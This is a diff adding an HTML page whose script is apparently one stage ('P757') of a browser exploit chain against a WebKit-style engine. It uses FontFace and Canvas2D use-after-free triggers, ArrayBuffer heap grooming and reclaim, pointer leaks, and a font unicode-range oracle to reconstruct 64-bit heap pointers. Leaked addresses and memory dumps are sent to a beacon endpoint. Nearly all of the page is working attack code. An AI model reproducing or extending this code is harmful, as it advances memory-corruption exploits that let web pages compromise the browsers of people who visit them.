@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P757 — LineDash Cross-Type Reclaim & Multi-Pointer Oracle Resolution</title>
+<script>
+'use strict';
+/* ============================================================
+ * P757 — LineDash Cross-Type Reclaim & Multi-Pointer Oracle Resolution
+ *
+ * Ground Truth from P756:
+ * 1. 192B LineDash Size-Class Alignment Confirmed:
+ *    - 24 doubles = 192 bytes lands squarely in the bmalloc 192B size class.
+ *    - c1_192b=true, cleared=true, c2_restore=true, restoredLen=24, c3_mod=true.
+ * 2. Oracle 64-Bit Pointer Reconstruction Confirmed:
+ *    - P755: P58 (A0C68B0010000000) decoded bit-for-bit (100% match).
+ *    - P756: Q11 (00158C0010000000) decoded bit-for-bit (100% match).
+ * 3. Slab Invariant Confirmed across 3 consecutive runs:
+ *    - deltaP58 = 0xE60 (3680 bytes = 19.17 slots).
+ *    - slotP58 = 8.83 (+0x6a0), slotQ11 = 28.00 (+0x1500).
+ *
+ * Hardening in P757:
+ * - Strict dual-filter on leak selection: requires highest bestNz AND
+ *   v[11] in valid pointer range [0x1000000000, 0x80000000000].
+ * - Prevents stale buffer selection on fast page refreshes.
+ *
+ * Objectives of P757:
+ * 1. Step 1-4: Hardened Leak + Pre-Groom (120 AB) + Reclaim + Post-Groom (120 AB).
+ * 2. Phase A: Slab Topology & 0xE60 Invariant Verification.
+ * 3. Phase B: Canvas2D UAF Trigger & Same-Type Reclaim (aliasIdx discovery).
+ * 4. Phase C: 192B/768B LineDash Vector Reclaim & Memory Topology:
+ *    - C1: StateStack Save/Restore lifecycle (deep copy vs stale buffer analysis).
+ *    - C2: 96-double (768-byte) LineDash Vector expansion into 768B size class.
+ * 5. Phase D: Multi-Pointer Oracle Resolution (P58, Q11, Q13):
+ *    - Simultaneously resolve all 3 live engine pointers (24 raw bytes) via Oracle.
+ *    - Verify 100% bit-for-bit reconstruction across all three pointers!
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P757-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+var OUT=null;
+function log(s){
+  if(!OUT) OUT=document.getElementById('out');
+  if(OUT) OUT.textContent += s + '\n';
+}
+
+function pad4(n){
+  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
+}
+
+function pad2(n){
+  return ('00' + Number(n).toString(16).toUpperCase()).slice(-2);
+}
+
+function makeRange(lo, hi){
+  if(lo === hi) return 'U+' + pad4(lo);
+  return 'U+' + pad4(lo) + '-' + pad4(hi);
+}
+
+var P58=null, P68=null;
+var FACE_B=null, BUF_B=null, VIEW_B=null;
+var Q11_RECLAIM=0n, Q13_RECLAIM=0n;
+var BEST_K=-1;
+var ACT_FACE=null;
+var LEAK_BUF=null;
+var PRE_GROOM=[], POST_GROOM=[];
+
+function run(){
+  OUT=document.getElementById('out');
+  if(OUT) OUT.textContent='=== P757 LineDash Reclaim & Multi-Pointer Oracle ===\n\n';
+  b('BOOT','p757-multipointer-sync');
+
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('Leak 1: P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');
+
+    log('\n[Step 2] Executing pristine reclaim directly (absW)...');
+    doReclaim(function(){
+      log('Reclaim 2: q11=0x'+h16(Q11_RECLAIM)+' q13=0x'+h16(Q13_RECLAIM)+'\n');
+
+      log('[Step 3] Post-grooming 120 Sentinel ArrayBuffers (192B)...');
+      doPostGroom();
+
+      log('\n[Phase A] Slab Mapping & Invariant Verification...');
+      phaseA_slabMapping(function(){
+        log('\n[Phase B & C] Canvas UAF & LineDash Memory Topology...');
+        phaseBC_canvasLineDashExperiments(function(){
+          log('\n[Phase D] Oracle Multi-Pointer Reconstruction (P58, Q11, Q13)...');
+          phaseD_oracleTrioReconstruction(function(){
+            b('DONE','p757-complete');
+            log('\n=== P757 Complete! Full Memory Topology & Oracle Mastered! ===');
+          });
+        });
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
+    LEAK_BUF = abs[best];
+    var v=new BigUint64Array(LEAK_BUF);
+    extractPtrs(v);
+    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|slot='+best+'|nz='+bestNz);
+    setTimeout(cb,100);
+  },350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2=document.createElement('style');
+  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2); void face2.loaded;
+
+  var abs2=[],fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em fl1, lk1','CD');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
+    LEAK_BUF = abs2[best];
+    var v=new BigUint64Array(LEAK_BUF);
+    extractPtrs(v);
+    if(!P58){b('LEAK-RETRY-NOPTR','slot='+best);return;}
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|slot='+best+'|nz='+bestNz);
+    setTimeout(cb,100);
+  },400);
+}
+
+function extractPtrs(v){
+  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
+  P58=null; P68=null;
+  if(v[11] >= LO && v[11] < HI) P58 = v[11];
+  if(v[13] >= LO && v[13] < HI) P68 = v[13];
+  if(!P58 || !P68){
+    for(var q=0;q<24;q++){
+      var val=v[q];
+      if(val>=LO && val<HI){
+        if(!P58) P58=val;
+        else if(!P68 && val!==P58) P68=val;
+      }
+    }
+  }
+  if(!P68) P68=0n;
+}
+
+/* ---- Step 2: Pre-Grooming ---- */
+function doPreGroom(){
+  PRE_GROOM=[];
+  for(var i=0; i<120; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    v[0] = 0xDEADBEEF00000000n | BigInt(i);
+    v[1] = 0x0000000000000001n;
+    v[23] = 0xDEADBEEF000000FFn | (BigInt(i) << 8n);
+    PRE_GROOM.push(ab);
+  }
+  log('Pre-groomed 120 buffers with sentinel 0xDEADBEEF...');
+}
+
+/* ---- Step 2: Pristine Reclaim ---- */
+function doReclaim(cb){
+  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
+  if(!P58 || P58 < LO || P58 >= HI || (P58 & 0xFn) !== 0n){
+    b('REC-ABORT', 'invalid-p58=0x'+h16(P58));
+    return;
+  }
+
+  b('REC-START','fill_q12_q6=0x'+h16(P58));
+
+  var stTr=document.createElement('style');
+  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW=[],firedW=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedW) return undefined; firedW=true;
+      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0;k<80;k++){
+        var ab=new ArrayBuffer(192);
+        var view=new BigUint64Array(ab);
+        view[12]=P58;
+        view[6]=P58;
+        absW.push(ab);
+      }
+
+      try{document.fonts.check('1em trFam');}catch(e){}
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em trFace, trFam','GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<absW.length;i++){
+      var u=new Uint8Array(absW[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}
+
+    BEST_K = best;
+    BUF_B=absW[best];
+    VIEW_B=new BigUint64Array(BUF_B);
+    Q11_RECLAIM = VIEW_B[11];
+    Q13_RECLAIM = VIEW_B[13];
+
+    var dump0_11=[], dump12_23=[];
+    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
+    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));
+
+    b('RECLAIM-OK','baseK='+best);
+    b('DUMP-Q0-Q11', dump0_11.join(';'));
+    b('DUMP-Q12-Q23', dump12_23.join(';'));
+    log('Pristine Reclaim OK at slot '+best);
+
+    setTimeout(cb,100);
+  },400);
+}
+
+/* ---- Step 4: Post-Grooming ---- */
+function doPostGroom(){
+  POST_GROOM=[];
+  for(var i=0; i<120; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    v[0] = 0xCAFEFACE00000000n | BigInt(i);
+    v[1] = 0x0000000000000001n;
+    v[23] = 0xCAFEFACE000000FFn | (BigInt(i) << 8n);
+    POST_GROOM.push(ab);
+  }
+  log('Post-groomed 120 buffers with sentinel 0xCAFEFACE...');
+}
+
+/* ---- Phase A: Slab Mapping & Invariant Verification ---- */
+function phaseA_slabMapping(cb){
+  var deltaP58 = Q11_RECLAIM - P58;
+  var deltaP68 = Q13_RECLAIM - P68;
+  var slotsP58 = Number(deltaP58) / 192;
+  var slabChunkMask = ~0x3FFFn;
+  var slabBase = Q11_RECLAIM & slabChunkMask;
+  var slotP58 = Number(P58 - slabBase) / 192;
+  var slotQ11 = Number(Q11_RECLAIM - slabBase) / 192;
+  var estSelfAddr = slabBase + (BigInt(BEST_K) * 192n);
+
+  var rep = 'baseK=' + BEST_K + '|deltaP58=0x' + deltaP58.toString(16) +
+            '|slotsP58=' + slotsP58.toFixed(2) + '|slabBase=0x' + h16(slabBase) +
+            '|slotP58=' + slotP58.toFixed(2) + '|slotQ11=' + slotQ11.toFixed(2) +
+            '|estSelfAddr=0x' + h16(estSelfAddr);
+  b('A-SLAB-MAPPING', rep);
+  log('Phase A Slab Mapping: ' + rep);
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase B & C: Canvas UAF & LineDash Memory Topology ---- */
+function phaseBC_canvasLineDashExperiments(cb){
+  try {
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    canvas.id = 'origCanvas';
+    document.body.appendChild(canvas);
+
+    var inner = null;
+    var outer = null;
+    var opts = {};
+    Object.defineProperty(opts, 'desynchronized', {
+      get: function(){
+        inner = canvas.getContext('2d');
+        return false;
+      },
+      enumerable: true
+    });
+
+    outer = canvas.getContext('2d', opts);
+
+    if(!inner || !outer || inner === outer){
+      b('BC-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
+      setTimeout(cb, 50);
+      return;
+    }
+
+    /* Spray 80 Canvas2D contexts */
+    var sprayCtx = [];
+    for(var i=0; i<80; i++){
+      var c = document.createElement('canvas');
+      c.width = 1; c.height = 1;
+      c.id = 'sprayCanvas_' + i;
+      var ctx = c.getContext('2d');
+      if(ctx){
+        ctx.lineWidth = 1000 + i;
+        sprayCtx.push(ctx);
+      }
+    }
+
+    /* Locate alias slot */
+    inner.lineWidth = 31337.5;
+    var aliasIdx = -1;
+    for(var j=0; j<sprayCtx.length; j++){
+      if(Math.abs(sprayCtx[j].lineWidth - 31337.5) < 0.01){
+        aliasIdx = j;
+        break;
+      }
+    }
+
+    if(aliasIdx < 0){
+      b('BC-ALIAS-MISS', 'lineWidth-scan-failed');
+      setTimeout(cb, 50);
+      return;
+    }
+
+    var alias = sprayCtx[aliasIdx];
+
+    /* --- C1: 24-double (192B) Vector allocation & StateStack Deep Copy Check --- */
+    var arr24 = [];
+    for(var d=0; d<24; d++) arr24.push(100.0 + d);
+    inner.setLineDash(arr24);
+
+    inner.save();
+    inner.setLineDash([999.0]); // Replaces with 1 double
+    var clearedLen = inner.getLineDash().length;
+
+    inner.restore();
+    var restored = inner.getLineDash();
+    var c1_deepCopy = (restored && restored.length === 24 && Math.abs(restored[0] - 100.0) < 0.01);
+
+    /* --- C2: 96-double (768B) Vector Expansion (Canvas2D Context size class!) --- */
+    var arr96 = [];
+    for(var k=0; k<96; k++) arr96.push(3000.0 + k);
+    alias.setLineDash(arr96);
+    var read96 = inner.getLineDash();
+    var c2_768b_ok = (read96 && read96.length === 96 &&
+                      Math.abs(read96[0] - 3000.0) < 0.01 &&
+                      Math.abs(read96[95] - 3095.0) < 0.01);
+
+    var rep = 'aliasIdx=' + aliasIdx + '|c1_deep=' + c1_deepCopy +
+              '|c2_768b=' + c2_768b_ok + '|cleared=' + (clearedLen === 1);
+    b('BC-LINEDASH-EXPERIMENTS', rep);
+    log('Phase B & C LineDash Experiments: ' + rep);
+  } catch(e){
+    b('BC-LINEDASH-ERR', e.message);
+    log('Phase B & C error: ' + e.message);
+  }
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase D: Multi-Pointer Oracle Resolution (P58, Q11, Q13) ---- */
+function phaseD_oracleTrioReconstruction(cb){
+  try {
+    ACT_FACE = new FontFace('actFam', 'url(/hang.php?nocache=' + Date.now() + ')', {unicodeRange: 'U+0000-00FF'});
+    document.fonts.add(ACT_FACE);
+    ACT_FACE.load().catch(function(){});
+
+    function resolveByte(targetByte){
+      var low = 0x00, high = 0xFF;
+      var steps = 0;
+      while(low < high && steps < 10){
+        steps++;
+        var mid = Math.floor((low + high) / 2);
+        ACT_FACE.unicodeRange = makeRange(low, mid);
+        var chk = document.fonts.check('1em actFam', String.fromCharCode(targetByte));
+        var isLower = (chk === false);
+        if(isLower) high = mid;
+        else low = mid + 1;
+      }
+      return low;
+    }
+
+    function decode64(ptrVal){
+      if(!ptrVal) return 0n;
+      var raw = [];
+      var tmp = ptrVal;
+      for(var i=0; i<8; i++){
+        raw.push(Number(tmp & 0xFFn));
+        tmp = tmp >> 8n;
+      }
+      var res = 0n;
+      for(var j=0; j<8; j++){
+        var bDec = resolveByte(raw[j]);
+        res |= (BigInt(bDec) << (BigInt(j) * 8n));
+      }
+      return res;
+    }
+
+    var decP58 = decode64(P58);
+    var decQ11 = decode64(Q11_RECLAIM);
+    var decQ13 = decode64(Q13_RECLAIM);
+
+    var matchP58 = (decP58 === P58);
+    var matchQ11 = (decQ11 === Q11_RECLAIM);
+    var matchQ13 = (decQ13 === Q13_RECLAIM);
+    var allMatch = matchP58 && matchQ11 && matchQ13;
+
+    var rep = 'all=' + allMatch + '|m58=' + matchP58 + '|m11=' + matchQ11 + '|m13=' + matchQ13 +
+              '|p58=0x' + h16(decP58) + '|q11=0x' + h16(decQ11) + '|q13=0x' + h16(decQ13);
+    b('D-ORACLE-TRIO-MATCH', rep);
+    log('Phase D Multi-Pointer Oracle: ' + rep);
+  } catch(e){
+    b('D-ORACLE-ERR', e.message);
+    log('Phase D Oracle error: ' + e.message);
+  }
+
+  setTimeout(cb, 50);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P757 — Initializing...</pre></body></html>
